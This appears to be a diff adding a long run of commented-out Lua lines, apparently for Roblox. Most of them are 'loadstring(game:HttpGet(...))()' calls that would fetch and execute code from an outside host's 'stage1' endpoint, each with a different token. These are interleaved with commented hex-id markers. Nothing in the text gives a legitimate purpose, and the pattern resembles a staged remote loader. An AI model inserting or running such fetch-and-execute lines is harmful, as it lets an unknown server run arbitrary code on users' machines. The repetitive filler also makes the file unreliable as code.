+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a7f38533fbc41dfb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_de44270cd78fd3a6", true))()
+--[[ _41812d2afe0f8e795ff1575d8f570f68 ]]
+--[[ _1e774dc7c9b826f577249a098a3dca23 ]]
+--[[ _2929b32f07fb270529f932b68f051ce6 ]]
+--[[ _b63b3094e8b76d4ea969cf177e4e9559 ]]
+--[[ _38d1af80025f9696ac14516c965614c5 ]]
+--[[ _83470e26a7bbbcb5cddfdc92781df088 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bbf30fc1d5f63618", true))()
+--[[ _484e5249c2eec24a431cfeafe3ec542f ]]
+--[[ _71927cd99725436c1f5eed06ec7e29c2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_08ed40db5a3691f2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_61f374974ae825e5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4287bec46bf1b14b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9f45bde388a79288", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d9695bd18e0cb8fd", true))()
+--[[ _f1fa0b55f9a4b385ec38224b8b51eec9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_88aaf8374655b302", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_438dc195f6216558", true))()
+--[[ _2bff8325e2b2522001f87d012ac1e772 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_950f9c118c3808b9", true))()
+--[[ _4b34aef722b6c02e3fde97f432da540d ]]
+--[[ _e39271af68e0dbac74d3b262ab3269cc ]]
+--[[ _8518472957c37e3747ef99f6dfa7a2cf ]]
+--[[ _c09713a05b3799b573f432bffa57b8b1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4af6aeb2ea397e91", true))()
+--[[ _c79d9271dc016aefd5c1b43a15ab7bd5 ]]
+--[[ _c66e765b8f6d745d5bac3e0e98a56e67 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b03f5614167651df", true))()
+--[[ _6ff1f68f5b19679cbe6628bb2537bb88 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ae449375fda88fda", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bd30d29f3934e303", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_06f60807c12a97a7", true))()
+--[[ _38f395142b98a0ff5b8095f0c14dda75 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f489da0ddbb4255c", true))()
+--[[ _57e964b303285c3c385cee261090653b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a1077765a7a1e853", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f512205bc5d7eba0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5e11098d3113758e", true))()
+--[[ _33398ecc7651d3f44e51ed0487acf558 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7ede7677ba42d25e", true))()
+--[[ _2413f30de1f811c8c45cecfc2cdf9987 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_95c480fb0f633532", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b5e0a3a422536bdb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_66ad7ed4ef999d2f", true))()
+--[[ _2e22ed5ca9498b6c37d7070380a354ae ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f7fd9a5e0a48b3cd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_89f20d966fe921fd", true))()
+--[[ _49ed81d7435967f48260d29b3b971b57 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f47b682d179aa6b", true))()
+--[[ _d46d622704e7e7dea1adedf769b46623 ]]
+--[[ _6ae35fc60caec60f4c6b40514d2aa0ea ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_20fe4f7db229f50e", true))()
+--[[ _81b227e4078ab99cfda0350ef54f7819 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_67d956cd30ed9722", true))()
+--[[ _57e92723461aa9ea853489067d114ec7 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3f8e09e74b178fce", true))()
+--[[ _307eed24a2401d963f562efab5e24520 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2747e2f1a02c7f49", true))()
+--[[ _b687f4ea1c20dd334b44b3ee98122dce ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_56e2ff9860e63fb3", true))()
+--[[ _de305366f3f80b9c31adc721300e987b ]]
+--[[ _a7e44f4994c51d892333326be6b1d101 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ccb85616c16dc989", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0084860de764799b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3c9962871ae8ec29", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4599f3ca012dfca7", true))()
+--[[ _6a9dbf2dce1cdc1c7e018533e66101d4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fa97d82703aba5e1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_023c0a63c4ca6910", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0e3fccea19d04bc3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6c0c71c486c72911", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_191b98ef69ffce2b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8c979174bce89377", true))()
+--[[ _44f54cd21e607b67fc35c0e22ab4bcd1 ]]
+--[[ _f17b8ffb24e8ac901b78da9682eefc30 ]]
+--[[ _bcbcc360cb9a581dd84609c19c6f807e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_abf6471a8a202f4c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f5aa2c5c32ad5fe2", true))()
+--[[ _fc4df29ec00d2622e0233850dce4cd19 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_616a859ad1baeba9", true))()
+--[[ _3128c560e6aea5b72667cea352490547 ]]
+--[[ _2f3924b965f31998e2ac689308e494b7 ]]
+--[[ _47d39ededcc696f737c4a42af314806d ]]
+--[[ _95eb9f106f5f380a7526d8b71d5b06f6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c9bd7b995e3dc69a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_17c20dcb5b499523", true))()
+--[[ _40aa923d5fed5c5ea61c357fecc43eae ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_517e46746d04e449", true))()
+--[[ _b4faf643a89b6446be8da43dc9a2aa9c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e5eca7326cea94ee", true))()
+--[[ _5c4164b85a2e4e8f8944aafdbea35d0c ]]
+--[[ _eb8508532886564401de11f80e843961 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_33977c497bc933cc", true))()
+--[[ _7c201b79ffe9438bbff1ac2b8beb4216 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_401b00ec39a20345", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1619a1053b5d7a61", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_249e3dcf697034ff", true))()
+--[[ _91ec199417cd9130aa8fbead40eb89a3 ]]
+--[[ _92d0145feb2496201b229cba6d3a6746 ]]
+--[[ _6354c966ac8dd789df6c41f91e6b99bb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e3bb1a37e88311df", true))()
+--[[ _fcf672f14abb356db93c9ac408841afc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8ff86e2b7eefecd5", true))()
+--[[ _2431204df8ffc0d589a97c58f2c2912b ]]
+--[[ _e94d5fef1d6e835ff95de5541be8aea4 ]]
+--[[ _aadccebdc8f253b6f210711e094d688d ]]
+--[[ _63e3bc025ac5c8245bd3d17560e8a82d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_01fc7d655c66965e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dd38e55564d7a569", true))()
+--[[ _7399b17ea626fb9dd7aee50d8589684a ]]
+--[[ _8868ae95a7abec52aa0e392fdac5170b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1a1cf978fece31e0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9c34bfaf19f6562f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cf21cbbaee4f3508", true))()
+--[[ _37f36424b8c6a5a3011ca4273b2ecaa1 ]]
+--[[ _6615f52a70959a3604b185df9e6103aa ]]
+--[[ _0138e7d06b0e817e3d168445db43a167 ]]
+--[[ _c90484c2203f789fe638b3b31168ab6b ]]
+--[[ _9649008c938daf16a4baaa10f7430f7d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ebb2e10fa2f87290", true))()
+--[[ _a576cee76c06677dd23a8432909399c1 ]]
+--[[ _54a048d1368cbf3f9834bdf1f635c084 ]]
+--[[ _5f50fbc94a92a82bb62049cb46ab0f9b ]]
+--[[ _403a638b87f1094d7225a2c278db4a31 ]]
+--[[ _9e02d6760583f7eb3849505c5ba759ab ]]
+--[[ _8d87a4a78fca6eae550de8f665122081 ]]
+--[[ _5f8754979c0d0d629333d77fbc12312b ]]
+--[[ _e161d3c956ca8f52207ca7e324fbaf41 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_50a648b0afc6610c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6f0c35f3de370cbf", true))()
+--[[ _91b8b4e8f36e3c89f1742d945e13e53d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_77b2114612601806", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ce218b36e73206cf", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_70a94201a9838345", true))()
+--[[ _17ca4f7f2a01222c49f2c2f9f112070a ]]
+--[[ _6b94635760c2af52c1b60a067ff998cf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_63cd19ffc35f0f85", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_886931d8949d62be", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6c9aa6a7af25e92f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f78682b6a815f538", true))()
+--[[ _437ed7ed400cd930155ae8121feb50b7 ]]
+--[[ _e9f4f9c8d7dc16b27abf02175f063a08 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_592e8fc050855c63", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bef1d52ca0167130", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f4cac6d8bf78d800", true))()
+--[[ _dd720fc06e8fb8addc91a2904db7b616 ]]
+--[[ _08a90910d7845fa713c33e300356c94b ]]
+--[[ _d5fd4b7462955327e9d9939e97327572 ]]
+--[[ _f5212354847239f37d29e292e3fa753a ]]
+--[[ _8426304214e72c242145c13a122a6c76 ]]
+--[[ _f0b0750ea380c00e901728fe2ab592f9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_261e45fb1991b79b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_258c7a518452d783", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8714716b55498b1a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_74443b8caa06c0da", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6c6d22d00c15e5b7", true))()
+--[[ _1ae0e944794d0b2cb56e239d7a3f07ee ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d01effd5a420a939", true))()
+--[[ _0539e24bbf38a6c50035f561e35f1d84 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1d4602a2fd09492f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b1925742e075fc76", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3cdbaab5402605d0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3f8041d7c97bc30c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e403a2c5535a380d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fe8c629bad8f0760", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4b4b7cf85e51dea3", true))()
+--[[ _30156e64a1297197ad914d27d7637b66 ]]
+--[[ _79cc69b184c8146186ca0bc76c024b3b ]]
+--[[ _dddd2d54ed2ef7d80c0a9ecc8b2b8bd2 ]]
+--[[ _07f31b1d75d42074fa31058b597c1cb5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_985e46f9c45d1262", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8824008867e4c061", true))()
+--[[ _000ef3cd34d56f751ceada2d69d8529e ]]
+--[[ _a8ff720141fc0253d422cf3a1ec719c2 ]]
+--[[ _157f1398d38014e1fd77b453ef360a8e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_247a7bae246b1ec0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_385da7d36f6be89c", true))()
+--[[ _9c23a85d47b5d97a7dd4ff65e9fc41a8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8508676585c6b687", true))()
+--[[ _531a7fd9669b977fc80bd2895a24ec8c ]]
+--[[ _b6f433eb0cf14dc6886b27c1e50b60b4 ]]
+--[[ _b5533f90e87012a5e5d7fd7eaeb8ec09 ]]
+--[[ _370d7ce0be8523f655de853e14be9c06 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_45f7ff79393c9e44", true))()
+--[[ _e8b4c752091a549d52a06163c6362229 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6145edd583db5bb1", true))()
+--[[ _3e3c151849cdd3409b55f7d13b4fb31b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_97f4ebae00f7856a", true))()
+--[[ _c1db90d49241080e0cd48b1666a02396 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4e6dd2d0b719c49d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9c0f43c0640462c3", true))()
+--[[ _1bd7d645813613c2945be4f0fc476a9d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e62ba3a7809b8b1c", true))()
+--[[ _1c11a916984ae894e6e3f6880891b8d1 ]]
+--[[ _1569212adf67ca30c43535aff15dda87 ]]
+--[[ _1e40be204c45c08fde6a09bc10ad1eac ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a1b57e2b0ac6671c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_87eb891b6b56f554", true))()
+--[[ _2cd9a185e20caf541e64e1e7ce494e91 ]]
+--[[ _7e20982e4c7cca24374db7603860eee2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b96bbfdeedfa65b3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_81d90b7fa3b417e2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_df8f32201675e6f6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_55e5fc0e31ebcd84", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9bc34f4e62ac753e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dc2e12acc14c5530", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_595caa45fe84b7c6", true))()
+--[[ _f9cfadcd8578882597079af38364d569 ]]
+--[[ _a6bb24aa61a503ca6907d81aaec3827c ]]
+--[[ _572f2e4365ad4dd70447a27f20becaa3 ]]
+--[[ _56a470dcd5d4f31ffdb1cf66256721c1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_18a8dd6b6b0f68b0", true))()
+--[[ _13b19dabe16c2721edc125db3b640d20 ]]
+--[[ _24c403e9325036011d4626934bb730d1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_036cb8b459a7a602", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4b28c5cc497a749d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_72eb8bc9ff6f9dfa", true))()
+--[[ _7a190691e963e8588e8942429083483a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a1c3c4a5e52ef864", true))()
+--[[ _da7159944951c87d315145b3e24fe36e ]]
+--[[ _71d10ae0ecaacbf61a67cac5f3bbb061 ]]
+--[[ _7a37105310aa6f6fdb321bf5d66d9adc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8bf61d27bd2543e8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6977f1479a30dc65", true))()
+--[[ _2dbd390e2dd994e017b9e97f2ead3892 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_935ca330c051c041", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5f9f2c9bfca9fc6e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3d2280d64fc11b81", true))()
+--[[ _42b2617b9e5f9d82fb03115dbad5a15f ]]
+--[[ _5bfc660d766bece0b57d113363b5c50f ]]
+--[[ _d7b508724078416afc008a3c75556146 ]]
+--[[ _26fa2544beb15286cfe5849c81751228 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f997aebcb32c06f9", true))()
+--[[ _3edd67665e7bd1104b6ca9990a63e441 ]]
+--[[ _eb99858cc541e731a20573e30b568aba ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0c7ef2c23cbf82dd", true))()
+--[[ _0a77b117bbe90952c6f191cb4cd98abd ]]
+--[[ _2d53495b51caba0ac93aa5c844689dbb ]]
+--[[ _44e3c94fe81cb5d3fddf28b9ec12315b ]]
+--[[ _ebae84e39cb77d9ac50b8182bfcac4d5 ]]
+--[[ _e8ae36158335dc7d55ef484310e998fb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_28696b436c2066d2", true))()
+--[[ _d51cca82d90c69f9eb35d9cc63af5178 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7fdf469c79d564cc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5eb2f9bbea60bb01", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b26ebfa7d8b20f19", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fbbbd1593f14a1f5", true))()
+--[[ _5f262a33985e8e74b0ed2a58e3729e18 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0f925a8337599a08", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3c5d1a7311378f0a", true))()
+--[[ _a9f7c026981972d618e0aac0a7c6b28b ]]
+--[[ _28003c5c1352755d6dd313badd051923 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c78cebc06482df88", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d4e71ecdd006b385", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4cf4063083a887b4", true))()
+--[[ _ce94a22a3321d3f06f61d76fecf8094f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0c28c45abecd1bee", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_89353b87dc6f06a1", true))()
+--[[ _169be6827070bb01e098df1b19c1d7b0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_327cfa7cb7d23fd7", true))()
+--[[ _944ed94b0048bb4f295908efc84de793 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fc08176da3f89859", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_85e3351a6d996469", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fb5ac27ac70d6843", true))()
+--[[ _1cca9903fcb3f0e80f3949c7b37b5ee8 ]]
+--[[ _0156e809a45c453bf2661e00d71843d7 ]]
+--[[ _e22ec771d443621cdd6062981dda589d ]]
+--[[ _9e4234e65cf70a14d416fc422f41bf1c ]]
+--[[ _07eeb86d06bd21937cf46c95e7444cf5 ]]
+--[[ _2fde5d1405228e09e19cc258263e6b0e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_76fa2040693dca8d", true))()
+--[[ _6a6486c6479be7e50226d2887ae52353 ]]
+--[[ _4c374eb6e0f9e66a85447a3120366fcd ]]
+--[[ _48f7e20cde42e0519369ae5762455679 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2e4bbfc558176e72", true))()
+--[[ _5c27b6d8e669aa8b80a3a7004b512726 ]]
+--[[ _92ca695446943c6bfb1172c6634ec2f6 ]]
+--[[ _1a7b1534ebea613d162ead252470072d ]]
+--[[ _8896aba467ca61bb613d1f3733514af7 ]]
+--[[ _7c36a58f8bb2701d61abea0d3a57e45c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_325b9389b6cafb60", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bad926a80dbc1059", true))()
+--[[ _abc56bc524a636ddd3a8012cdc5416b7 ]]
+--[[ _24888b811582aadcff018c917e802c2b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_790bc3e1e4fa3c12", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1086e107021c62ea", true))()
+--[[ _b417d3dc658b16160101e3412e700dac ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7159115124155b11", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2f66885783813fb1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_712fd4f0f85b7c07", true))()
+--[[ _a587a8b4861394d6f65e87286506969b ]]
+--[[ _2d5eedd06637e940ff1757e91ca8deb6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a8ea2b5ad3a36b0a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_05dff69f5d268e94", true))()
+--[[ _bde1e4696c96ce6925beb7675c837e84 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_26ba03ec60b528e8", true))()
+--[[ _202ba364385f8226182a6ca0eb4a04ef ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a23af501a8b1d590", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bfb56d4295bb5a38", true))()
+--[[ _f73034d8dcbf65947d89913e02f9d51f ]]
+--[[ _92875431c335b796a82d2b3f47977317 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2295c0b2ced432c6", true))()
+--[[ _a3129f59a158a43a95f0da4a2f4b1d37 ]]
+--[[ _2bd0c21cf749a16d1a5cf041997d3798 ]]
+--[[ _e4b0a4166907388159d1e15de33e9bd6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_334af910953bdbbe", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fb30814b95794c69", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_df81af9710eff4ab", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1cd2cc0ee1e389fe", true))()
+--[[ _444602df44d06d4e7a7cbf978640c4bf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1b7d264c4819d5fd", true))()
+--[[ _8d98f4f91bb588249cec354bcaccb074 ]]
+--[[ _00653bdd058cffb66ae0dfd64b952764 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8bd63c35d1fa531f", true))()
+--[[ _d68ace41c163bbb3ea33160483a3ee29 ]]
+--[[ _b71080b910f41b560f189bd88060e2e9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b8f8c49a6cee271c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b11c8d9430569adb", true))()
+--[[ _545c971e016b2640a8678c931ad1b175 ]]
+--[[ _11d22f8d7d8befce6c9df9f873842a3d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3a8d15d4546f8d95", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_168ea65ad0e6f4f4", true))()
+--[[ _0979eca070c345d296999a791160c072 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_5dc836c5152217b1", true))()
+--[[ _4aae6abc08cb103f680ec3b7546db068 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2c4dbdca2d904e29", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_82d2a4466c5b2730", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8460ff4e3f5a525d", true))()
+--[[ _d88f344d28e79a6d7201e5e254fa15f0 ]]
+--[[ _0ffb389b0238c98bf148d19acc12a257 ]]
+--[[ _390d2e20bf5691ffcf44688650788d22 ]]
+--[[ _c33867248de962735ddd438856c57b06 ]]
+--[[ _b412bc0b321aa0ca6add7cf312f220ee ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_839ae726e7a96e01", true))()
+--[[ _137509ecbc3d37d13bb093bb2e4a326a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c6d1b81ee4e10b03", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ef944bee9bdbbebd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_571ff7bf2bd61014", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0adfe053da930ec8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e294b4699e042c04", true))()
+--[[ _99beb6530b821697d0e4587a1e02009d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_02d81891f3454b11", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1027de122b069703", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ee3cc53d56288cc6", true))()
+--[[ _3fd47d4b24f2783dfff950dcbafc8f22 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3c1453274cb89bbc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_024531ce80ea59b7", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b83a5d4e7f3ef0f8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_04539e37409cdc4d", true))()
+--[[ _b6dca025a357c7cd214ebfddba7dd6aa ]]
+--[[ _061de3f889ba7f520437e38573c79735 ]]
+--[[ _99b647a939f34be9f350a7950605aba8 ]]
